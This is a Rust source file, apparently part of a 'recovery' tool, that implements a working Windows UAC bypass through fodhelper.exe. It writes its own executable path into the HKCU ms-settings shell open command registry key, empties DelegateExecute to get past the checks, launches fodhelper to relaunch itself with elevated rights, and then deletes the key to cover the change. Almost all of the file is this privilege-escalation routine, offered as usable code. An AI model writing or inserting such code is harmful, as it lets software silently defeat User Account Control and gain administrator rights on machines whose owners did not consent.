use crate::recovery::settings::RecoveryControl;
use std::env;
use std::process::Command;
use tracing::{debug, info, warn};
use winreg::enums::*;
use winreg::RegKey;

pub fn is_admin() -> bool {
    let output = Command::new("net")
        .arg("session")
        .output();
    
    match output {
        Ok(out) => out.status.success(),
        Err(_) => false,
    }
}

pub async fn attempt_uac_bypass() {
    if !RecoveryControl::global().uac_bypass_enabled() {
        return;
    }

    if is_admin() {
        debug!("already running with administrative privileges");
        return;
    }

    info!("attempting UAC bypass via fodhelper");

    if let Err(err) = fodhelper_bypass() {
        warn!(error = ?err, "UAC bypass failed");
    } else {
        info!("UAC bypass triggered, exiting current process");
        std::process::exit(0);
    }
}

fn fodhelper_bypass() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?.to_string_lossy().to_string();
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    
    // 1. Create ms-settings class structure
    let base_path = r"Software\Classes\ms-settings\Shell\Open\command";
    let (key, _) = hkcu.create_subkey(base_path)?;
    
    // 2. Set the command to execute ourself
    key.set_value("", &current_exe)?;
    
    // 3. Set DelegateExecute to empty string to bypass modern checks
    key.set_value("DelegateExecute", &"")?;

    // 4. Start fodhelper.exe
    let _ = Command::new("fodhelper.exe").spawn()?;

    // 5. Brief sleep to allow execution before cleanup
    std::thread::sleep(std::time::Duration::from_millis(2000));

    // 6. Cleanup
    let _ = hkcu.delete_subkey_all(r"Software\Classes\ms-settings");

    Ok(())
}
